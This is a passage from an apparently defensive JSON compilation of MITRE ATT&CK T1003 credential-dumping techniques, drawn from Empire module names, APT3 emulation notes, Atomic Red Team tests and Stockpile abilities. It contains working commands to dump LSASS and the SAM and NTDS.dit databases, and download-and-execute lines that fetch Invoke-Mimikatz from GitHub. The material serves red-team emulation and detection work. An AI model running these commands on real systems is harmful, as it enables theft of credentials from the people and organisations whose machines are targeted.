"https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/mcafee_sitelist", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/hashdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/hashdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/mimipenguin", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/mimipenguin", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/hashdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/hashdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/kerberosdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/kerberosdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/multi/kerberos_inject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/multi/kerberos_inject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/etcd_crawler", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/etcd_crawler", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / start\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.\n\n[*] Signal sent to start the VSS service.\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / create c\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.\n\n[*] Attempting to create a shadow copy.\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / list\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.\n\nSHADOW COPIES\n=============\n\n[*] ID: {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8}\n[*] Client accessible: True\n[*] Count: 1\n[*] Device object:? \\\\ \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1\n[*] Differential: True\n[*] Exposed locally: False\n[*] Exposed name:\n[*] Exposed remotely: False\n[*] Hardware assisted: False\n[*] Imported: False\n[*] No auto release: True\n[*] Not surfaced: False\n[*] No writers: True\n[*] Originating machine: ICBC.abcc.org\n[*] Persistent: True\n[*] Plex: False\n[*] Provider ID: {B5946137-7B9F-4925-AF80-51ABD60B20D5}\n[*] Service machine: ICBC.abcc.org\n[*] Set ID: {584C48BF-649D-4B35-9CAE-3165C2C8BE53}\n[*] State: 12\n[*] Transportable: False\n[*] Volume name:? \\\\ \\ Volume {16da2094-7213-420f-a023-db7b3e3a7f6f} \\\n\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> copy \\\\ \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1 \\ windows \\ ntds \\ ntds.dit C:? \\\nWe have copied a file.\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / delete\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.", "name": "Dos"}], "command_list": ["hashdump\nmimikatz !lsadump::sam", "hashdump\nrun hashdump\nrun smart_hashdump\npost/windows/gather/credentials/domain_hashdump", "logonpasswords\nmimikatz !sekurlsa::logonpasswords\nmimikatz !sekurlsa::msv\nmimikatz !sekurlsa::kerberos\nmimikatz !sekurlsa::wdigest", "use mimikatz\nwdigest\nmsv\nkerberos\nlogonpasswords", "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\n", "#{gsecdump_exe} -a\n", "PathToAtomicsFolder\\T1003\\bin\\gsecdump.exe -a\n", "#{gsecdump_exe} -a\n", "PathToAtomicsFolder\\T1003\\bin\\wce.exe -o #{output_file}\n", "PathToAtomicsFolder\\T1003\\bin\\wce.exe -o #{output_file}\n", "#{wce_exe} -o %temp%\\output.txt\n", "#{wce_exe} -o %temp%\\output.txt\n", "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n", "#{procdump_exe} -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\n", "PathToAtomicsFolder\\T1003\\bin\\procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\n", "PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n", "PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit\n", "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\" q q\n", "vssadmin.exe create shadow /for=C:\n", "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n", "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE\n", "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n", ". PathToAtomicsFolder\\T1003\\src\\Get-GPPPassword.ps1\nGet-GPPPassword -Verbose\n", ". PathToAtomicsFolder\\T1003\\src\\Get-GPPPassword.ps1\nGet-GPPPassword -Verbose\n", "pypykatz live lsa\n", "pypykatz live registry\n", {"windows": {"psh": {"command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n", "payload": "powerview.ps1"}}}, {"windows": {"psh": {"command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n"}}}, {"windows": {"psh": {"command": ".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n", "payload": "totallylegit.exe"}}}, {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}, "command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n", "payload": "invoke-mimi.ps1"}}}, {"windows": {"psh": {"command": "reg query HKLM /f password /t REG_SZ /s\n"}}}, {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}, "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds\n"}}}, "ntdsutil.exe", "\\\\Windows\\\\.+\\\\lsass.exeHKLM\\SAM|HKLM\\Security", "\\\\Windows\\\\.+\\\\bcryptprimitives.dll|\\\\Windows\\\\.+\\\\bcrypt.dll|\\\\Windows\\\\.+\\\\ncrypt.dll", "powershell/collection/ChromeDump", "powershell/collection/ChromeDump", "powershell/collection/FoxDump", "powershell/collection/FoxDump", "powershell/collection/ninjacopy", "powershell/collection/ninjacopy", "powershell/collection/vaults/add_keepass_config_trigger", "powershell/collection/vaults/add_keepass_config_trigger", "powershell/collection/vaults/find_keepass_config", "powershell/collection/vaults/find_keepass_config", "powershell/collection/vaults/get_keepass_config_trigger", "powershell/collection/vaults/get_keepass_config_trigger", "powershell/collection/vaults/keethief", "powershell/collection/vaults/keethief", "powershell/collection/vaults/remove_keepass_config_trigger", "powershell/collection/vaults/remove_keepass_config_trigger", "powershell/credentials/enum_cred_store", "powershell/credentials/enum_cred_store", "powershell/credentials/mimikatz/cache", "powershell/credentials/mimikatz/cache", "powershell/credentials/mimikatz/command", "powershell/credentials/mimikatz/command", "powershell/credentials/mimikatz/dcsync", "powershell/credentials/mimikatz/dcsync", "powershell/credentials/mimikatz/dcsync_hashdump", "powershell/credentials/mimikatz/dcsync_hashdump", "powershell/credentials/mimikatz/extract_tickets", "powershell/credentials/mimikatz/extract_tickets", "powershell/credentials/mimikatz/golden_ticket", "powershell/credentials/mimikatz/golden_ticket", "powershell/credentials/mimikatz/logonpasswords", "powershell/credentials/mimikatz/logonpasswords", "powershell/credentials/mimikatz/lsadump", "powershell/credentials/mimikatz/lsadump", "powershell/credentials/mimikatz/mimitokens", "powershell/credentials/mimikatz/mimitokens", "powershell/credentials/mimikatz/sam", "powershell/credentials/mimikatz/sam", "powershell/credentials/mimikatz/silver_ticket", "powershell/credentials/mimikatz/silver_ticket", "powershell/credentials/mimikatz/trust_keys", "powershell/credentials/mimikatz/trust_keys", "powershell/credentials/powerdump", "powershell/credentials/powerdump", "powershell/credentials/vault_credential", "powershell/credentials/vault_credential", "powershell/management/downgrade_account", "powershell/management/downgrade_account", "powershell/management/wdigest_downgrade", "powershell/management/wdigest_downgrade", "powershell/privesc/gpp", "powershell/privesc/gpp", "powershell/privesc/mcafee_sitelist", "powershell/privesc/mcafee_sitelist", "python/collection/linux/hashdump", "python/collection/linux/hashdump", "python/collection/linux/mimipenguin", "python/collection/linux/mimipenguin", "python/collection/osx/hashdump", "python/collection/osx/hashdump", "python/collection/osx/kerberosdump", "python/collection/osx/kerberosdump", "python/management/multi/kerberos_inject", "python/management/multi/kerberos_inject", "python/situational_awareness/network/dcos/etcd_crawler", "python/situational_awareness/network/dcos/etcd_crawler", "Dos\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / start\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.\n\n[*] Signal sent to start the VSS service.\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / create c\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.\n\n[*] Attempting to create a shadow copy.\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / list\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.\n\nSHADOW COPIES\n=============\n\n[*] ID: {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8}\n[*] Client accessible: True\n[*] Count: 1\n[*] Device object:? \\\\ \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1\n[*] Differential: True\n[*] Exposed locally: False\n[*] Exposed name:\n[*] Exposed remotely: False\n[*] Hardware assisted: False\n[*] Imported: False\n[*] No auto release: True\n[*] Not surfaced: False\n[*] No writers: True\n[*] Originating machine: ICBC.abcc.org\n[*] Persistent: True\n[*] Plex: False\n[*] Provider ID: {B5946137-7B9F-4925-AF80-51ABD60B20D5}\n[*] Service machine: ICBC.abcc.org\n[*] Set ID: {584C48BF-649D-4B35-9CAE-3165C2C8BE53}\n[*] State: 12\n[*] Transportable: False\n[*] Volume name:? \\\\ \\ Volume {16da2094-7213-420f-a023-db7b3e3a7f6f} \\\n\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> copy \\\\ \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1 \\ windows \\ ntds \\ ntds.dit C:? \\\nWe have copied a file.\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / delete\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved."], "technique_id": "T1003", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1003", "Built-in Windows Command": "", "Cobalt Strike": "hashdump\nmimikatz !lsadump::sam", "Description": "Dumps hashes from the SAM Hive file.", "Metasploit": "hashdump\nrun hashdump\nrun smart_hashdump\npost/windows/gather/credentials/domain_hashdump"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1003", "Built-in Windows Command": "", "Cobalt Strike": "logonpasswords\nmimikatz !sekurlsa::logonpasswords\nmimikatz !sekurlsa::msv\nmimikatz !sekurlsa::kerberos\nmimikatz !sekurlsa::wdigest", "Description": "This technique injects into the LSASS.exe process and scrapes its memory for plaintext passwords of logged on users. You must do this from a high integrity process. \nThe Mimikatz project has a lot of different capabilities (https://github.com/gentilkiwi/mimikatz/wiki) such as pass-the-hash, pass-the-ticket, creating silver/golden tickets, dumping credentials, and elevating a process.", "Metasploit": "use mimikatz\nwdigest\nmsv\nkerberos\nlogonpasswords"}}, {"Atomic Red Team Test - Credential Dumping": {"display_name": "Credential Dumping", "atomic_tests": [{"description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script\n", "supported_platforms": ["windows"], "name": "Powershell Mimikatz", "input_arguments": {"remote_script": {"default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1", "type": "Url", "description": "URL to a remote Mimikatz script that dumps credentials"}}, "executor": {"elevation_required": true, "command": "IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\n", "name": "powershell"}}, {"dependencies": [{"description": "Gsecdump must exist on disk at specified location (#{gsecdump_exe})\n", "get_prereq_command": "$parentpath = Split-Path \"#{gsecdump_exe}\"; $binpath = \"$parentpath\\gsecdump-v2b5.exe\"\nIEX(IWR \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1\")\nif(Invoke-WebRequestVerifyHash \"#{gsecdump_url}\" \"$binpath\" #{gsecdump_bin_hash}){\n  Move-Item $binpath \"#{gsecdump_exe}\"\n}\n", "prereq_command": "if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Gsecdump", "executor": {"elevation_required": true, "command": "#{gsecdump_exe} -a\n", "name": "command_prompt"}, "description": "Dump credentials from memory using Gsecdump\n", "input_arguments": {"gsecdump_bin_hash": {"default": "94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC", "type": "String", "description": "File hash of the Gsecdump binary file"}, "gsecdump_exe": {"default": "PathToAtomicsFolder\\T1003\\bin\\gsecdump.exe", "type": "Path", "description": "Path to the Gsecdump executable"}, "gsecdump_url": {"default": "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe", "type": "url", "description": "Path to download Gsecdump binary file"}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "Windows Credential Editor must exist on disk at specified location (#{wce_exe})\n", "get_prereq_command": "$parentpath = Split-Path \"#{wce_exe}\"; $zippath = \"$parentpath\\wce.zip\"\nIEX(IWR \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1\")\nif(Invoke-WebRequestVerifyHash \"#{wce_url}\" \"$zippath\" #{wce_zip_hash}){\n  Expand-Archive $zippath $parentpath\\wce -Force\n  Move-Item $parentpath\\wce\\wce.exe \"#{wce_exe}\"\n  Remove-Item $zippath, $parentpath\\wce -Recurse\n}\n", "prereq_command": "if (Test-Path #{wce_exe}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Windows Credential Editor", "executor": {"elevation_required": true, "command": "#{wce_exe} -o #{output_file}\n", "name": "command_prompt"}, "description": "Dump credentials from memory using Windows Credential Editor from https://www.ampliasecurity.com/research/windows-credentials-editor/\n", "input_arguments": {"wce_exe": {"default": "PathToAtomicsFolder\\T1003\\bin\\wce.exe", "type": "Path", "description": "Path of Windows Credential Editor executable"}, "wce_url": {"default": "https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip", "type": "url", "description": "Path to download Windows Credential Editor zip file"}, "output_file": {"default": "%temp%\\output.txt", "type": "Path", "description": "Path where resulting data should be placed"}, "wce_zip_hash": {"default": "8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933", "type": "String", "description": "File hash of the Windows Credential Editor zip file"}}, "dependency_executor_name": "powershell"}, {"description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n", "supported_platforms": ["windows"], "name": "Registry dump of SAM, creds, and secrets", "executor": {"elevation_required": true, "command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n", "name": "command_prompt", "cleanup_command": "del %temp%\\sam >nul 2> nul\ndel %temp%\\system >nul 2> nul\ndel %temp%\\security >nul 2> nul\n"}}, {"dependencies": [{"description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n", "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"$env:TEMP\\Procdump.zip\"\nExpand-Archive $env:TEMP\\Procdump.zip $env:TEMP\\Procdump -Force\nNew-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null\nCopy-Item $env:TEMP\\Procdump\\Procdump.exe #{procdump_exe} -Force\n", "prereq_command": "if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Dump LSASS.exe Memory using ProcDump", "executor": {"elevation_required": true, "command": "#{procdump_exe} -accepteula -ma lsass.exe #{output_file}\n", "name": "command_prompt", "cleanup_command": "del \"#{output_file}\" >nul 2> nul\n"}, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. The tool may be downloaded from https://docs.microsoft.com/en-us/sysinternals/downloads/procdump.\n", "input_arguments": {"output_file": {"default": "C:\\Windows\\Temp\\lsass_dump.dmp", "type": "Path", "description": "Path where resulting dump should be placed"}, "procdump_exe": {"default": "PathToAtomicsFolder\\T1003\\bin\\procdump.exe", "type": "Path", "description": "Path of Procdump executable"}}, "dependency_executor_name": "powershell"}, {"description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task\nManager and administrative permissions.\n", "supported_platforms": ["windows"], "name": "Dump LSASS.exe Memory using Windows Task Manager", "executor": {"steps": "1. Open Task Manager:\n  On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking\n  on the task bar and selecting \"Task Manager\".\n\n2. Select lsass.exe:\n  If lsass.exe is not visible, select \"Show processes from all users\". This will allow you to observe execution of lsass.exe\n  and select it for manipulation.\n\n3. Dump lsass.exe memory:\n  Right-click on lsass.exe in Task Manager. Select \"Create Dump File\". The following dialog will show you the path to the saved file.\n", "name": "manual"}}, {"dependencies": [{"description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n", "get_prereq_command": "Invoke-WebRequest \"https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip\" -OutFile \"$env:TEMP\\Mimi.zip\"\nExpand-Archive $env:TEMP\\Mimi.zip $env:TEMP\\Mimi -Force\nNew-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null\nCopy-Item $env:TEMP\\Mimi\\x64\\mimikatz.exe #{mimikatz_exe} -Force\n", "prereq_command": "if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}\n"}, {"description": "Lsass dump must exist at specified location (#{input_file})\n", "get_prereq_command": "Write-Host \"Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)\"\n", "prereq_command": "cmd /c \"if not exist #{input_file} (exit /b 1)\"\n"}], "supported_platforms": ["windows"], "name": "Offline Credential Theft With Mimikatz", "executor": {"elevation_required": true, "command": "#{mimikatz_exe} \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n", "name": "command_prompt"}, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz.\n", "input_arguments": {"mimikatz_exe": {"default": "PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe", "type": "string", "description": "Path of the Mimikatz binary"}, "input_file": {"default": "%tmp%\\lsass.DMP", "type": "Path", "description": "Path of the Lsass dump"}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "Target must be a Domain Controller\n", "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n", "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n"}], "supported_platforms": ["windows"], "name": "Dump Active Directory Database with NTDSUtil", "executor": {"elevation_required": true, "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q\n", "name": "command_prompt"}, "input_arguments": {"output_folder": {"default": "C:\\Windows\\Temp", "type": "Path", "description": "Path where resulting dump should be placed"}}, "description": "The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n"}, {"dependencies": [{"description": "Target must be a Domain Controller\n", "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n", "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n"}], "supported_platforms": ["windows"], "name": "Create Volume Shadow Copy with NTDS.dit", "executor": {"elevation_required": true, "command": "vssadmin.exe create shadow /for=#{drive_letter}\n", "name": "command_prompt"}, "input_arguments": {"drive_letter": {"default": "C:", "type": "String", "description": "Drive letter to source VSC (including colon)"}}, "description": "The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n"}, {"dependencies": [{"description": "Target must be a Domain Controller\n", "get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n", "prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n"}, {"description": "Volume shadow copy must exist\n", "get_prereq_command": "echo Run \"Invoke-AtomicTest T1003 -TestName 'Create Volume Shadow Copy with NTDS.dit'\" to fulfuill this requirement\n", "prereq_command": "if not exist #{vsc_name} (exit /b 1)\n"}, {"description": "Extract path must exist\n", "get_prereq_command": "mkdir #{extract_path}\n", "prereq_command": "if not exist #{extract_path} (exit /b 1)\n"}], "supported_platforms": ["windows"], "name": "Copy NTDS.dit from Volume Shadow Copy", "executor": {"elevation_required": true, "command": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n", "name": "command_prompt", "cleanup_command": "del \"#{extract_path}\\ntds.dit\"        >nul 2> nul\ndel \"#{extract_path}\\VSC_SYSTEM_HIVE\" >nul 2> nul\ndel \"#{extract_path}\\SYSTEM_HIVE\"     >nul 2> nul\n"}, "input_arguments": {"vsc_name": {"default": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1", "type": "String", "description": "Name of Volume Shadow Copy"}, "extract_path": {"default": "C:\\Windows\\Temp", "type": "Path", "description": "Path for extracted NTDS.dit"}}, "description": "The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with NTDS.dit\".\nA successful test also requires the export of the SYSTEM Registry hive. \nThis test must be executed on a Windows Domain Controller.\n"}, {"dependencies": [{"description": "Computer must be domain joined\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "GPP Passwords (findstr)", "executor": {"elevation_required": false, "command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n", "name": "command_prompt"}, "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n", "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}\n", "get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{gpp_script_path}\") -Force | Out-Null\nInvoke-WebRequest #{gpp_script_url} -OutFile \"#{gpp_script_path}\"\n", "prereq_command": "if(Test-Path \"#{gpp_script_path}\") {exit 0 } else {exit 1 }\n"}, {"description": "Computer must be domain joined\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "GPP Passwords (Get-GPPPassword)", "executor": {"elevation_required": false, "command": ". #{gpp_script_path}\nGet-GPPPassword -Verbose\n", "name": "powershell"}, "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\n", "input_arguments": {"gpp_script_path": {"default": "PathToAtomicsFolder\\T1003\\src\\Get-GPPPassword.ps1", "type": "Path", "description": "Path to the Get-GPPPassword PowerShell Script"}, "gpp_script_url": {"default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1", "type": "url", "description": "URL of the Get-GPPPassword PowerShell Script"}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "Computer must have python 3 installed\n", "get_prereq_command": "echo \"Python 3 must be installed manually\"\n", "prereq_command": "if (python --version) {exit 0} else {exit 1}\n"}, {"description": "Computer must have pip installed\n", "get_prereq_command": "echo \"PIP must be installed manually\"\n", "prereq_command": "if (pip3 -V) {exit 0} else {exit 1}\n"}, {"description": "pypykatz must be installed and part of PATH\n", "get_prereq_command": "pip3 install pypykatz\n", "prereq_command": "if (cmd /c pypykatz -h) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "LSASS read with pypykatz", "executor": {"elevation_required": true, "command": "pypykatz live lsa\n", "name": "command_prompt"}, "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n  \n", "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "Computer must have python 3 installed\n", "get_prereq_command": "echo \"Python 3 must be installed manually\"\n", "prereq_command": "if (python --version) {exit 0} else {exit 1}\n"}, {"description": "Computer must have pip installed\n", "get_prereq_command": "echo \"PIP must be installed manually\"\n", "prereq_command": "if (pip3 -V) {exit 0} else {exit 1}\n"}, {"description": "pypykatz must be installed and part of PATH\n", "get_prereq_command": "pip3 install pypykatz\n", "prereq_command": "if (cmd /c pypykatz -h) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Registry parse with pypykatz", "executor": {"elevation_required": true, "command": "pypykatz live registry\n", "name": "command_prompt"}, "description": "Parses registry hives to obtain stored credentials\n", "dependency_executor_name": "powershell"}], "attack_technique": "T1003"}}, {"Mitre Stockpile - Get a list of all computers in a domain": {"platforms": {"windows": {"psh": {"command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n", "payload": "powerview.ps1"}}}, "description": "Get a list of all computers in a domain", "tactic": "credential-access", "technique": {"attack_id": "T1003", "name": "Credential Dumping"}, "id": "0360ede1-3c28-48d3-a6ef-6e98f562c5af", "name": "GetComputers (Alice)"}}, {"Mitre Stockpile - Dump lsass for later use with mimikatz": {"platforms": {"windows": {"psh": {"command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = 